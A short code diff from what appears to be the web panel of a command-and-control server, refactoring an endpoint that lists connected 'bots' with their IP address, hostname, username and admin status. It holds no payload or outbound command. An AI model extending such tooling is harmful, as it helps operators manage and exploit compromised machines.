@@ -130,20 +130,17 @@ def index():
 @app.route('/api/targets')
 def get_targets():
     targets = []
-    for bot_id in Bot.botList:
-        bot = Bot.botList[bot_id]
-        target_data = {
+    for bot_id, bot in Bot.botList.items():
+        targets.append({
             'id': bot.id,
-            'ip': str(bot.ip),
-            'alias': bot.alias,
-            'connected_time': bot.connected_time.isoformat(),
-            'last_seen': bot.last_seen.isoformat(),
+            'ip': f"{bot.ip[0]}:{bot.ip[1]}",
             'os_type': bot.os_type,
             'hostname': bot.hostname,
             'username': bot.username,
-            'is_admin': bot.is_admin
-        }
-        targets.append(target_data)
+            'is_admin': bot.is_admin,
+            'alias': bot.alias,
+            'last_seen': bot.last_seen.isoformat()
+        })
     return jsonify(targets)
 
 def allowed_file(filename):
